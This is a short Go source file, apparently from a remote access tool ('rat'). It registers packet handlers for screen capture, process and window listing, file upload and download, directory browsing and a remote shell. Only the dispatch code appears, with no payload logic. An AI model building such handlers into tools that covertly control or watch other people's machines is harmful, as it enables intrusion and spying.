package main

import (
	"rat/shared/network/header"
)

type PacketMap map[header.PacketHeader]IncomingPacket

var packets PacketMap

type OutgoingPacket interface {
	Header() header.PacketHeader
	Init(c *Client)
}

type IncomingPacket interface {
	OnReceive(c *Client) error
}

type Packet struct{}

func InitPackets() {
	packets = make(PacketMap)
	packets[header.PingHeader] = Ping{}
	packets[header.ComputerInfoHeader] = ComputerInfoPacket{}
	packets[header.ScreenHeader] = ScreenPacket{}
	packets[header.ProcessHeader] = ProcessPacket{}
	packets[header.MonitorsHeader] = MonitorsPacket{}
	packets[header.DirectoryHeader] = DirectoryPacket{}
	packets[header.PutFileHeader] = UploadPacket{}
	packets[header.GetFileHeader] = DownloadPacket{}
	packets[header.ShellHeader] = ShellPacket{}
	packets[header.WindowsHeader] = WindowsPacket{}
}

func GetIncomingPacket(header header.PacketHeader) IncomingPacket {
	return packets[header]
}
